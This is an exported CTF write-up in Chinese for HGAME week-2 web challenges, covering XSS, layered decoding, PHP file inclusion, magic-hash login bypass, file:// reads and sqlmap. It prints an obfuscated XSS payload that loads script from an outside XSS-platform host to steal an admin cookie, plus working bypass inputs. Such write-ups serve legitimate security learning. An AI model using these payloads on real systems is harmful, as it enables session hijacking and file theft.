<html>
<head>
  <title>Evernote Export</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="YXBJ Windows/600718 (zh-CN, DDL); Windows/10.0.0 (Win64);"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="1707"/>

<div>
<span><div><span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 16pt;"><span style="font-size: 16pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">Cosmos的聊天室</span></font></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">考点：xss漏洞利用，md5加密</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">（1）</span><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;; font-weight: bold; text-decoration: underline;">浏览器解析HTML标签时，从&quot;&lt;&quot;到最近的一个&quot;&gt;&quot;为一个标签</span><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">，&quot;&lt;&quot;与&quot;&gt;&quot;之间的字符，除了标签名之外，其余的被当作属性。例如</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image.png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">那么第二个&quot;&lt;&quot;和&quot;span&quot;被浏览器当作属性名解析，并且赋值为 &quot;&quot; ：</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [1].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">如果alert()没有加上双引号&quot;&quot;，onerror的值是从&quot;=&quot;一直到空白符号，或者&quot;&gt;&quot;：</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [2].png" type="image/png" data-filename="Image.png"/></span><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [3].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [4].png" type="image/png" data-filename="Image.png"/></span><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [5].png" type="image/png" data-filename="Image.png" width="535"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;; font-weight: bold; text-decoration: underline;">浏览器解析HTML文档的另一个特性是：自动补全闭合标签。</span>可以看到&lt;span&gt;的闭合标签&lt;/span&gt;已经被当属性分解后，仍然有&lt;/span&gt;，这是浏览器的自动补全所造成的。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">注意：上述&lt;img&gt;代码仍然触发xss，因为可以看到经过浏览器的分解和补全后，仍然是完整的&lt;img&gt;标签。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">利用：当后端过滤掉&quot;&lt;xxx&gt;&quot;完整的标签时，可以输入：&lt;img xxx  ，不需要&quot;&gt;&quot;闭合。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">（2）由于后端将字母转换成大写字母，从而导致js函数失效时，可以利用HTML转义绕过。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">（3）md5加密，python3：</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [6].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">-&gt;md5加密的方法在 hashlib 模块。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">-&gt; encode()方法将字符串转换成 bytes 类型。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">-&gt; md5()方法加密。</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">-&gt; hexdigest()返回摘要。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">1、主页面</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [7].png" type="image/png" data-filename="Image.png" width="488"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">2、点击flag，提示需要管理员的token，猜想需要盗取cookie</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [8].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">3、根据提示，我发送到当前界面的信息可以被提交到后台管理员处，说明：<span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;; font-weight: bold;">在当前页面注入JavaScript脚本，成功触发xss后，提交这些脚本给admin，admin浏览后就会触发xss，如果要盗取cookie，则需要注入盗取cookie的脚本，这个可以利用xss平台实现。</span></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">xss平台提供的脚本：</span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;"><img src="HGAME writeup week(2)_files/Image [9].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt; color: rgb(48, 49, 51); font-family: &quot;Microsoft YaHei&quot;;">将函数部分进行HTML转义，并且加上双引号&quot;&quot;包括(最好加上双引号，否则函数将与&lt;/span结合，失去作用)，最终payload：</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&lt;img src=x onerror=&quot;&amp;#101;&amp;#118;&amp;#97;&amp;#108;&amp;#40;&amp;#97;&amp;#116;&amp;#111;&amp;#98;&amp;#40;&amp;#39;&amp;#99;&amp;#122;&amp;#49;&amp;#106;&amp;#99;&amp;#109;&amp;#86;&amp;#104;&amp;#100;&amp;#71;&amp;#86;&amp;#70;&amp;#98;&amp;#71;&amp;#86;&amp;#116;&amp;#90;&amp;#87;&amp;#53;&amp;#48;&amp;#75;&amp;#67;&amp;#100;&amp;#122;&amp;#89;&amp;#51;&amp;#74;&amp;#112;&amp;#99;&amp;#72;&amp;#81;&amp;#110;&amp;#75;&amp;#84;&amp;#116;&amp;#105;&amp;#98;&amp;#50;&amp;#82;&amp;#53;&amp;#76;&amp;#109;&amp;#70;&amp;#119;&amp;#99;&amp;#71;&amp;#86;&amp;#117;&amp;#90;&amp;#69;&amp;#78;&amp;#111;&amp;#97;&amp;#87;&amp;#120;&amp;#107;&amp;#75;&amp;#72;&amp;#77;&amp;#112;&amp;#79;&amp;#51;&amp;#77;&amp;#117;&amp;#99;&amp;#51;&amp;#74;&amp;#106;&amp;#80;&amp;#83;&amp;#100;&amp;#111;&amp;#100;&amp;#72;&amp;#82;&amp;#119;&amp;#79;&amp;#105;&amp;#56;&amp;#118;&amp;#101;&amp;#72;&amp;#78;&amp;#122;&amp;#99;&amp;#72;&amp;#81;&amp;#117;&amp;#89;&amp;#50;&amp;#57;&amp;#116;&amp;#76;&amp;#50;&amp;#70;&amp;#85;&amp;#79;&amp;#88;&amp;#89;&amp;#48;&amp;#90;&amp;#106;&amp;#56;&amp;#110;&amp;#75;&amp;#48;&amp;#49;&amp;#104;&amp;#100;&amp;#71;&amp;#103;&amp;#117;&amp;#99;&amp;#109;&amp;#70;&amp;#117;&amp;#90;&amp;#71;&amp;#57;&amp;#116;&amp;#75;&amp;#67;&amp;#107;&amp;#61;&amp;#39;&amp;#41;&amp;#41;&quot;</div></div><div><span style="font-size: 12pt;">4、发送当前界面，xss得到cookie，接下来可以提交了：</span></div><div><img src="HGAME writeup week(2)_files/Image [10].png" type="image/png" data-filename="Image.png" width="563"/><img src="HGAME writeup week(2)_files/Image [11].png" type="image/png" data-filename="Image.png"/></div><div><span style="font-size: 12pt;">5、md5暴力破解：</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [12].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [13].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;">6、输入code为9242201,提交，成功盗取admin的cookie，替换掉自身的token，点击链接，得到flag：</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [14].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [15].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 16pt;"><span style="font-size: 16pt; font-weight: bold;">Cosmos的新语言</span></font></div><div><span style="font-size: 12pt;">考点：python爬取网页，常见的加密和解密</span></div><div><span style="font-size: 12pt;">（1）</span><span style="font-size: 12pt; font-weight: bold;">encode()和decode()是python字符串的内置方法，需要对字符串加密和解密时，添加参数即可</span><span style="font-size: 12pt;">。</span></div><div><span style="font-size: 12pt;">-&gt;base64加密：string.encode('base64')</span></div><div><span style="font-size: 12pt;">-&gt;base64解密：string.decode('base64')</span></div><div><span style="font-size: 12pt;">-&gt;凯撒加密：string.encode('rot13')</span></div><div><span style="font-size: 12pt;">-&gt;凯撒解密：string.decode('rot13')</span></div><div><span style="font-size: 12pt;">（2）</span><span style="font-size: 12pt; font-weight: bold;">HTMLParse模块</span><span style="font-size: 12pt;">含有</span><span style="font-size: 12pt;">HTML转义方法，导入模块后，需要创建HTMLParse类的实例，方可引用其中的方法。</span></div><div><span style="font-size: 12pt;">-&gt;h = HTMLParse.HTMLParse()  创建实例</span></div><div><span style="font-size: 12pt;">-&gt;h.unescape(string)：HTML转义</span></div><div><span style="font-size: 12pt;">（3）<span style="font-size: 12pt; font-weight: bold;">re模块含有正则匹配的方法，可以搜索字符串。</span></span></div><div><span style="font-size: 12pt;">-&gt;compile('模式')</span></div><div><span style="font-size: 12pt;">-&gt;findall(字符串)</span></div><div><span style="font-size: 12pt;">-&gt;例：</span><span style="font-size: 12pt; font-weight: bold;">re.compile('模式').findall(字符串)[0][a:b] </span> <span style="font-size: 12pt;">    返回string类型</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1、主页</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [16].png" type="image/png" data-filename="Image.png" width="858"/></span></div><div><span style="font-size: 12pt;">2、执行了另一个文件mycode的代码，查看另一个文件的内容</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [17].png" type="image/png" data-filename="Image.png" width="926"/></span></div><div><span style="font-size: 12pt;">3、只有$_POST['token']===$_SERVER['token']条件为真，才能得到flag。而$_SERVER['token']进行了多层加密，密文是主页的复杂字符串，这就需要编写解密脚本。另外刷新这两个页面，密文和加密方式会改变，因此只能编写python脚本，并利用脚本解密以及post提交明文。</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [18].png" type="image/png" data-filename="Image.png"/></span><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [19].png" type="image/png" data-filename="Image.png" width="925"/></span></div><div><span style="font-size: 12pt;">4、脚本:</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>#coding=utf-8</div><div>import requests as rq</div><div>import re</div><div>import HTMLParser</div><div># 翻转字符串</div><div>def strrev(s):</div><div>    r = ''</div><div>    for i in range(len(s)):</div><div>        r = s[i] + r</div><div>    return r</div><div># 功能：将字符串的每一个字符的ASCII值加 1</div><div>def decrypt(s):</div><div>    r = ''</div><div>    for i in range(len(s)):</div><div>        r = r+chr(ord(s[i])-1)</div><div>    return r</div><div># 对密文 s 进行多层解密，cs属于列表类型，每一个元素是一层加密</div><div>def f(s , cs):</div><div>    h = HTMLParser.HTMLParser()           # 创建实例</div><div>    s = h.unescape(s)                     # HTML字符解码</div><div>    for i in range(len(cs)):</div><div>        if cs[i] == 'base64_encode':</div><div>            s = s.decode('base64')</div><div>        elif cs[i] == 'str_rot13':</div><div>            s = s.decode('rot13')</div><div>        elif cs[i] == 'strrev':</div><div>            s = strrev(s)</div><div>        else:</div><div>            s = decrypt(s)</div><div>    return s</div><div><br/></div><div># 获取密文</div><div>url2 = 'http://6f4b8bfb3e.php.hgame.n3ko.co/'</div><div>result2 = rq.get(url2)</div><div>print &quot;index.php的内容 : \n&quot; + result2.content</div><div>s = re.compile(r'&lt;/code&gt;</div><div>\n.*</div><div>').findall(result2.text)[0][12:-4]</div><div>print &quot;\n密文:&quot;</div><div>print s + '\n'</div><div><br/></div><div># 获取加密方式</div><div>url = 'http://6f4b8bfb3e.php.hgame.n3ko.co/mycode'</div><div>result = rq.get(url)</div><div>c = re.compile('echo[_A-Za-z1-9\(\)]*').findall(result.text)[0][5:]</div><div>cs = c.split('(')              # 分隔含有加密函数名的字符串，cs列表的元素是一个个加密函数名</div><div>cs.pop()                       # 去掉末尾的空白</div><div><br/></div><div># 对密文执行f()--多层解密</div><div>print &quot;明文$_SEVER['token']：&quot;</div><div>print f(s , cs)</div><div><br/></div><div># 将明文作为token的值，以post方法发送</div><div>token = f(s,cs)</div><div>result3 = rq.post(url2 , data={&quot;token&quot;:token})</div><div>print &quot;mycode的内容：&quot;</div><div>print &quot;\n&quot;+result3.text</div><div><br/></div><div># 获取flag</div><div>print &quot;\nflag：&quot;</div><div>print re.compile('hgame.*}').findall(result3.text)[0]</div></div><div><span style="font-size: 12pt;">5、执行脚本，得到flag</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 16pt;"><span style="font-size: 16pt; font-weight: bold;">Cosmos的博客后台</span></font></div><div><span style="font-size: 12pt;">考点：文件包含、php伪协议、弱类型比较hash的缺陷、php函数parse_url()、curl读取资源</span></div><div><span style="font-size: 12pt;">（1）</span><span style="font-size: 12pt; font-weight: bold; text-decoration: underline;">include &quot;php://filter/read=convert.base64-encode/resource=文件路径&quot;可以读取文件系统的文件</span><span style="font-size: 12pt;">，php://是流封装协议，filter是过滤器，read的值是过滤器种类，整个语句&quot;php</span><span style="font-size: 12pt;">://filter/read=convert.base64-encode/</span><span style="font-size: 12pt;">&quot;的意思就是读取resource目标文件的内容时进行base64加密。</span></div><div><span style="font-size: 12pt;">（2）<span style="font-size: 12pt; font-weight: bold; text-decoration: underline;">&quot;==&quot;比较字符串时，以&quot;0e&quot;开头的字符串被解释成科学计数法的0的n次幂，即结果为0，那么&quot;==&quot;比较两个以&quot;0e&quot;开头的hash时，结果为true。</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>if(&quot;0e545993274517709034328855841020&quot; == &quot;0e481036490867661113260034900752&quot;){</div><div>    echo &quot;true&quot;;</div><div>}else{</div><div>    echo &quot;false&quot;;</div><div>}</div><div>结果：true</div></div><div><span style="font-size: 12pt;">如此，我们不必得到真正的密码，只要输入一个md5加密后以&quot;0e&quot;开头的密码，就可以绕过这种弱类型比较密码的认证方式。</span></div><div><span style="font-size: 12pt;">（3）<span style="font-size: 12pt; font-weight: bold; text-decoration: underline;">parse_url()函数的作用是试图解析一个url标识符，但这里并不一定是url标识符。</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>var_dump( parse_url(&quot;file://localhost/flag.php&quot;));</div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 9pt; color: rgb(51, 51, 51); font-family: Monaco;">结果：</span></div><div>array(3) {</div><div>  [&quot;scheme&quot;]=&gt;</div><div>  string(4) &quot;file&quot;</div><div>  [&quot;host&quot;]=&gt;</div><div>  string(9) &quot;localhost&quot;</div><div>  [&quot;path&quot;]=&gt;</div><div>  string(9) &quot;/flag.php&quot;</div><div>}</div></div><div><span style="font-size: 12pt;">（4）</span><span style="font-size: 12pt; font-weight: bold; text-decoration: underline;">curl支持file伪协议，读取文件的路径等于parse_url()解析后的path值。</span><span style="font-size: 12pt;">因此，如果遇到&quot;file://localhost/etc/flag.php&quot;这样的标识符时，parse_url()解析后，path=&quot;</span><span style="font-size: 12pt;">/etc/flag.php</span><span style="font-size: 12pt;">&quot;，所以curl读取文件的路径是&quot;/etc/flag.php&quot;。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1、主页面</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [20].png" type="image/png" data-filename="Image.png" width="384"/></span></div><div><span style="font-size: 12pt;">2、这是一个登录页面，url的参数是action=login.php，明显考点是文件包含(include $_GET['action'])，所以用伪协议（php://filter/read=convert.base64-encode/resource=）读取文件（为什么这里不直接读取flag？因为&quot;flag&quot;字符串已经被禁止了）</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [21].png" type="image/png" data-filename="Image.png" width="856"/></span></div><div><span style="font-size: 12pt;">3、base64解码后，得到login.php的源码</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [22].png" type="image/png" data-filename="Image.png" width="718"/></span></div><div><span style="font-size: 12pt;">4、继续用伪协议读取文件，得到index.php和admin.php的源代码，无法直接读取config.php和flag，因为参数值含有字符串&quot;config&quot;和&quot;flag&quot;会被过滤</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [23].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;">5、审计代码，发现login.php还可以接收一个参数$_GET['debug']，并且最后可以输出$$debug的值，通过这里可以得到需要的用户名($admin_username)和密码($admin_password)</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [24].png" type="image/png" data-filename="Image.png" width="919"/></span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [25].png" type="image/png" data-filename="Image.png" width="926"/></span></div><div><span style="font-size: 12pt;">6、密码是md5密文，而且利用彩虹表无法撞出明文，再考虑后端对用户名和密码的认证，发现是hash的弱类型比较，可以绕过</span><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [26].png" type="image/png" data-filename="Image.png" width="848"/></span><span style="font-size: 12pt;">：</span></div><div><span style="font-size: 12pt;">7、输入用户名：</span> <span style="font-size: 12pt;">Cosmos!  密码：</span><span style="position: unset;"><span style="font-size: 12pt;">s878926199a    这个密码md5加密后的密文是以&quot;0e&quot;开头，在&quot;==&quot;比较字符串时，它被解释成科学计数法的0的n次幂，结果为0，所以这里&quot;==&quot;的左右两边都是0，条件判断为真，成功绕过，进入后台</span></span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [27].png" type="image/png" data-filename="Image.png" width="842"/></span></div><div><span style="font-size: 12pt;">8、审计admin.php的代码，又是一个任意读取文件的漏洞，post接收的参数url，必须含有localhost，而根据题目提示，flag在根目录（非网站根目录），所以用file伪协议读取文件系统的文件，payload:</span></div><div><span style="font-size: 12pt;">file://localhost/flag，这里的读取路径是 /flag，即根目录下的flag</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [28].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 12pt;">9、得到加密后的flag，base64解密后得到flag</span></div><div><span style="font-size: 12pt;"><img src="HGAME writeup week(2)_files/Image [29].png" type="image/png" data-filename="Image.png" width="624"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 16pt;"><b>Cosmos的留言板-1</b></font></div><div><span style="font-size: 12pt;">考点：sql注入，sqlmap工具</span></div><div><span style="font-size: 12pt;">（1）使用sqlmap的篡改脚本space2comment绕过过滤机制。</span></div><div><span style="font-size: 12pt;">sqlmap.py -u url --tamper=space2comment</span></div></span>
</div></body></html> 